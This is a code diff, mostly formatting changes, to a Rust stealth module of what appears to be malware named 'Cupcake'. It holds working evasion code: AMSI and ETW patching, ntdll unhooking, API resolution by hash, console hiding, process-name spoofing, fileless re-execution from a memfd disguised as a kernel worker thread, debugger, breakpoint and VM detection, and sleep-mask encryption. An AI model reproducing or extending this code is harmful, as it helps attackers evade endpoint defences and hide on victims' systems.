@@ -6,17 +6,18 @@
 // - Layer B (feature = "stealth-adv"): version-sensitive enhancements with runtime gates + fallback
 
 #[cfg(windows)]
-pub mod peb;
-#[cfg(windows)]
 pub mod integrity;
 #[cfg(windows)]
+pub mod peb;
+// Sleep-mask AES heap/PE crypto — only when feature sleep-mask (pulls `aes` crate)
+#[cfg(all(windows, feature = "sleep-mask"))]
 pub mod mask;
 #[cfg(windows)]
 pub mod stack;
 #[cfg(windows)]
-pub mod version;
-#[cfg(windows)]
 pub mod unhook;
+#[cfg(windows)]
+pub mod version;
 
 #[cfg(windows)]
 pub use unhook::{alloc_guarded, unhook_ntdll};
@@ -26,15 +27,14 @@ pub use unhook::{alloc_guarded, unhook_ntdll};
 pub mod adv;
 
 #[cfg(windows)]
-pub use peb::{get_module_base, get_api_addr};
+pub use integrity::{patch_amsi, patch_etw};
 #[cfg(windows)]
-pub use integrity::{patch_etw, patch_amsi};
+pub use peb::{ensure_module_base, get_api_addr, get_module_base};
 #[cfg(windows)]
 pub use version::{
     get_windows_version, is_supported_for_nt_create_user_process, WindowsVersion,
     NT_CREATE_USER_PROCESS_MIN_BUILD,
 };
-
 
 pub const fn hash_module_name(s: &[u8]) -> u32 {
     let mut h: u32 = 0;
@@ -66,12 +66,14 @@ pub fn hide_console() {
         let h_module = get_module_base(hash_module_name(b"kernel32.dll"));
         let get_console = get_api_addr(h_module, hash_api_name(b"GetConsoleWindow"));
         if let Some(get_console_addr) = get_console {
-            let get_console_win: unsafe extern "system" fn() -> usize = std::mem::transmute(get_console_addr);
+            let get_console_win: unsafe extern "system" fn() -> usize =
+                std::mem::transmute(get_console_addr);
             let win = get_console_win();
             if win != 0 {
                 let user32 = get_module_base(hash_module_name(b"user32.dll"));
                 if let Some(show_window) = get_api_addr(user32, hash_api_name(b"ShowWindow")) {
-                    let show: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(show_window);
+                    let show: extern "system" fn(usize, i32) -> i32 =
+                        std::mem::transmute(show_window);
                     show(win, 0); // SW_HIDE
                 }
             }
@@ -83,7 +85,7 @@ pub fn setup_diagnostic_console() {
     #[cfg(windows)]
     unsafe {
         let h_kernel32 = get_module_base(hash_module_name(b"kernel32.dll"));
-        
+
         // 1. Aggressively try to get a console
         if let Some(alloc_addr) = get_api_addr(h_kernel32, hash_api_name(b"AllocConsole")) {
             let alloc_console: unsafe extern "system" fn() -> i32 = std::mem::transmute(alloc_addr);
@@ -95,26 +97,59 @@ pub fn setup_diagnostic_console() {
             let ods: unsafe extern "system" fn(*const u8) = std::mem::transmute(ods_addr);
             ods(b"diag: console requested\n\0".as_ptr());
         }
-        
+
         // 3. Re-open standard streams to the console
         if let Some(set_std_addr) = get_api_addr(h_kernel32, hash_api_name(b"SetStdHandle")) {
-            if let Some(create_file_addr) = get_api_addr(h_kernel32, hash_api_name(b"CreateFileA")) {
-                let create_file: unsafe extern "system" fn(*const u8, u32, u32, *mut (), u32, u32, *mut ()) -> usize = std::mem::transmute(create_file_addr);
-                let set_std_handle: unsafe extern "system" fn(u32, usize) -> i32 = std::mem::transmute(set_std_addr);
-                
+            if let Some(create_file_addr) = get_api_addr(h_kernel32, hash_api_name(b"CreateFileA"))
+            {
+                let create_file: unsafe extern "system" fn(
+                    *const u8,
+                    u32,
+                    u32,
+                    *mut (),
+                    u32,
+                    u32,
+                    *mut (),
+                ) -> usize = std::mem::transmute(create_file_addr);
+                let set_std_handle: unsafe extern "system" fn(u32, usize) -> i32 =
+                    std::mem::transmute(set_std_addr);
+
                 let conout = b"CONOUT$\0";
-                let h_con = create_file(conout.as_ptr(), 0xC0000000, 2, std::ptr::null_mut(), 3, 0, std::ptr::null_mut());
-                
+                let h_con = create_file(
+                    conout.as_ptr(),
+                    0xC0000000,
+                    2,
+                    std::ptr::null_mut(),
+                    3,
+                    0,
+                    std::ptr::null_mut(),
+                );
+
                 if h_con != (usize::MAX) {
                     set_std_handle(0xFFFFFFF5, h_con); // STD_OUTPUT_HANDLE
                     set_std_handle(0xFFFFFFF4, h_con); // STD_ERROR_HANDLE
-                    
+
                     // Direct confirmation write
-                    if let Some(write_addr) = get_api_addr(h_kernel32, hash_api_name(b"WriteConsoleA")) {
-                        let write_console: unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *mut ()) -> i32 = std::mem::transmute(write_addr);
+                    if let Some(write_addr) =
+                        get_api_addr(h_kernel32, hash_api_name(b"WriteConsoleA"))
+                    {
+                        let write_console: unsafe extern "system" fn(
+                            usize,
+                            *const u8,
+                            u32,
+                            *mut u32,
+                            *mut (),
+                        )
+                            -> i32 = std::mem::transmute(write_addr);
                         let msg = b"\r\n[diag] console ready\r\n";
                         let mut written = 0;
-                        write_console(h_con, msg.as_ptr(), msg.len() as u32, &mut written, std::ptr::null_mut());
+                        write_console(
+                            h_con,
+                            msg.as_ptr(),
+                            msg.len() as u32,
+                            &mut written,
+                            std::ptr::null_mut(),
+                        );
                     }
                 }
             }
@@ -217,7 +252,7 @@ pub fn spoof_process_name(_name: &str) {
                 libc::PROT_READ | libc::PROT_WRITE,
                 libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                 -1,
-                0
+                0,
             );
 
             if arg_area != libc::MAP_FAILED {
@@ -226,7 +261,7 @@ pub fn spoof_process_name(_name: &str) {
                 std::ptr::copy_nonoverlapping(
                     name_bytes.as_ptr(),
                     arg_area as *mut u8,
-                    name_bytes.len()
+                    name_bytes.len(),
                 );
                 // Add null terminator
                 *((arg_area as *mut u8).add(name_bytes.len())) = 0;
@@ -245,7 +280,9 @@ pub fn spoof_process_name(_name: &str) {
                     libc::prctl(45, 2, arg_end, 0, 0);
                 } else {
                     // Fallback: PR_SET_MM requires CAP_SYS_ADMIN
-                    crate::utils::db_print("[Cupcake] PR_SET_MM failed (likely missing CAP_SYS_ADMIN), using fallback");
+                    crate::utils::db_print(
+                        "[Cupcake] PR_SET_MM failed (likely missing CAP_SYS_ADMIN), using fallback",
+                    );
                 }
             }
         }
@@ -272,7 +309,7 @@ pub fn spawn_memfd_clone() -> Option<u32> {
         let fd = libc::syscall(
             libc::SYS_memfd_create,
             memfd_name.as_ptr(),
-            libc::MFD_CLOEXEC
+            libc::MFD_CLOEXEC,
         ) as i32;
 
         if fd < 0 {
@@ -292,7 +329,9 @@ pub fn spawn_memfd_clone() -> Option<u32> {
         let mut buf = [0u8; 4096];
         loop {
             let n = libc::read(self_fd, buf.as_mut_ptr() as *mut libc::c_void, 4096);
-            if n <= 0 { break; }
+            if n <= 0 {
+                break;
+            }
             libc::write(fd, buf.as_ptr() as *const libc::c_void, n as usize);
         }
         libc::close(self_fd);
@@ -301,14 +340,14 @@ pub fn spawn_memfd_clone() -> Option<u32> {
         let pid = libc::fork();
         if pid == 0 {
             // Child process: execute from memfd
-            let argv: Vec<std::ffi::CString> = vec![
-                std::ffi::CString::new("[kworker/u8:0-events]").ok()?,
-            ];
+            let argv: Vec<std::ffi::CString> =
+                vec![std::ffi::CString::new("[kworker/u8:0-events]").ok()?];
             let envp: Vec<std::ffi::CString> = vec![];
 
-            libc::fexecve(fd,
+            libc::fexecve(
+                fd,
                 argv.iter().map(|s| s.as_ptr()).collect::<Vec<_>>().as_ptr(),
-                envp.iter().map(|s| s.as_ptr()).collect::<Vec<_>>().as_ptr()
+                envp.iter().map(|s| s.as_ptr()).collect::<Vec<_>>().as_ptr(),
             );
             // fexecve doesn't return on success
             libc::exit(1);
@@ -318,10 +357,7 @@ pub fn spawn_memfd_clone() -> Option<u32> {
         libc::close(fd);
 
         if pid > 0 {
-            crate::utils::db_print(&format!(
-                "[Cupcake] Spawned memfd clone with PID: {}",
-                pid
-            ));
+            crate::utils::db_print(&format!("[Cupcake] Spawned memfd clone with PID: {}", pid));
             Some(pid as u32)
         } else {
             None
@@ -330,7 +366,9 @@ pub fn spawn_memfd_clone() -> Option<u32> {
 }
 
 #[cfg(not(target_os = "linux"))]
-pub fn spawn_memfd_clone() -> Option<u32> { None }
+pub fn spawn_memfd_clone() -> Option<u32> {
+    None
+}
 
 // =============================================================================
 // 🛡️ Phase 2: Anti-Debug / Anti-EDR / Anti-VM / Anti-Forensics Suite
@@ -345,9 +383,13 @@ pub fn is_debugger_present() -> bool {
         {
             let peb: u64;
             std::arch::asm!("mov {0}, qword ptr gs:[0x60]", out(reg) peb);
-            if peb == 0 { return false; }
+            if peb == 0 {
+                return false;
+            }
             let peb_ptr = peb as *const u8;
-            if *peb_ptr.add(2) != 0 { return true; }
+            if *peb_ptr.add(2) != 0 {
+                return true;
+            }
             let nt_global = *(peb_ptr.add(0xBC) as *const u32);
             (nt_global & 0x70) != 0
         }
@@ -355,9 +397,13 @@ pub fn is_debugger_present() -> bool {
         {
             let peb: u32;
             std::arch::asm!("mov {0}, dword ptr fs:[0x30]", out(reg) peb);
-            if peb == 0 { return false; }
+            if peb == 0 {
+                return false;
+            }
             let peb_ptr = peb as *const u8;
-            if *peb_ptr.add(2) != 0 { return true; }
+            if *peb_ptr.add(2) != 0 {
+                return true;
+            }
             let nt_global = *(peb_ptr.add(0x68) as *const u32);
             (nt_global & 0x70) != 0
         }
@@ -365,7 +411,9 @@ pub fn is_debugger_present() -> bool {
 }
 
 #[cfg(not(windows))]
-pub fn is_debugger_present() -> bool { false }
+pub fn is_debugger_present() -> bool {
+    false
+}
 
 /// Hardware breakpoint detection (Dr0-Dr3)
 /// On Windows x86_64, we use IsDebuggerPresent as fallback since reading
@@ -378,7 +426,9 @@ pub fn check_hardware_breakpoints() -> bool {
 }
 
 #[cfg(not(all(windows, any(target_arch = "x86_64", target_arch = "x86"))))]
-pub fn check_hardware_breakpoints() -> bool { false }
+pub fn check_hardware_breakpoints() -> bool {
+    false
+}
 
 /// CPUID hypervisor detection (leaf 1 ECX bit 31 + leaf 0x40000000 vendor).
 #[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
@@ -414,12 +464,16 @@ pub fn is_vm_via_cpuid() -> bool {
 }
 
 #[cfg(not(any(target_arch = "x86_64", target_arch = "x86")))]
-pub fn is_vm_via_cpuid() -> bool { false }
+pub fn is_vm_via_cpuid() -> bool {
+    false
+}
 
 /// Secure zeroization: volatile write to prevent compiler optimization
 pub fn secure_zeroize(data: &mut [u8]) {
     for b in data.iter_mut() {
-        unsafe { std::ptr::write_volatile(b, 0); }
+        unsafe {
+            std::ptr::write_volatile(b, 0);
+        }
     }
     std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
 }
